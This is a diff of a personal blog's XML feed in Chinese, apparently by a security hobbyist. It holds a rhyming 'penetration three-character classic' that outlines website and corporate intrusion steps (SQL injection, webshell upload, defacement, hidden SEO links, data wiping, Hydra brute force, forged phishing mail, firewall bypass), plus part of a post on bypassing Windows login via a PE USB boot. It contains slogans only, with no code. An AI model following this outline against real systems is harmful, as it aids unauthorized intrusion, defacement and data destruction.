-<p>渗透网站娱乐版<br>进谷歌  找注入<br>没注入  就旁注<br>没旁注  用0day<br>没0day  猜目录<br>没目录  就嗅探<br>爆账户  找后台<br>传小马  放大马<br>拿权限  挂页面<br>放暗链  清数据</p>
-<p><br>渗透企业实战版<br>搞企业  先扫描<br>扫描器  商业好<br>默密码  都知道<br>社工库  找一找<br>邮箱号  先列好<br>九头蛇  跑一跑<br>搞不定  放大招<br>发邮件  凭伪造<br>没邮箱  搞网站<br>二级域  皆可爆<br>老漏洞  没修好<br>新漏洞  刷一票<br>干研发  Git 找<br>源代码  全都要<br>C D N  可以跳<br>防火墙  可以撬<br>堡垒机  可以秒<br>云防护  可以秒<br>是企业  没有哪家搞不了！<br><br></p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>破解部分windows密码（win7用粘滞键，winxp等用pe）</title>
     <url>/2020/02/07/%E7%A0%B4%E8%A7%A3%E9%83%A8%E5%88%86windows%E5%AF%86%E7%A0%81%EF%BC%88win7%E7%94%A8%E7%B2%98%E6%BB%9E%E9%94%AE%EF%BC%8Cwinxp%E7%AD%89%E7%94%A8pe%EF%BC%89/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12271610.html">源地址：https://www.cnblogs.com/This-is-Y/p/12271610.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -4714,6 +4737,17 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>　　思路，从bios系统修改电脑启动顺序，让u盘启动优先级高于硬盘，之后插入制作好的pe盘</p>
 <p>　　网上搜索pe系统，可以找到如大白菜，老毛桃等pe系统，安装到u盘上，然后在电脑开机的时候，加入bios系统，具体进入方法因电脑而异，需要上网去查，进入后，在boot下，修改　优先级，之后插入u盘，重启电脑。进入pe系统，差不多就完成了。因为u盘没在身边，所有就简单记录一下，没有实验。</p>
 <p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>渗透三字经</title>
+    <url>/2020/10/22/%E6%B8%97%E9%80%8F%E4%B8%89%E5%AD%97%E7%BB%8F/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13861334.html">源地址：https://www.cnblogs.com/This-is-Y/p/13861334.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>渗透网站娱乐版<br>进谷歌  找注入<br>没注入  就旁注<br>没旁注  用0day<br>没0day  猜目录<br>没目录  就嗅探<br>爆账户  找后台<br>传小马  放大马<br>拿权限  挂页面<br>放暗链  清数据</p>
+<p><br>渗透企业实战版<br>搞企业  先扫描<br>扫描器  商业好<br>默密码  都知道<br>社工库  找一找<br>邮箱号  先列好<br>九头蛇  跑一跑<br>搞不定  放大招<br>发邮件  凭伪造<br>没邮箱  搞网站<br>二级域  皆可爆<br>老漏洞  没修好<br>新漏洞  刷一票<br>干研发  Git 找<br>源代码  全都要<br>C D N  可以跳<br>防火墙  可以撬<br>堡垒机  可以秒<br>云防护  可以秒<br>是企业  没有哪家搞不了！<br><br></p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
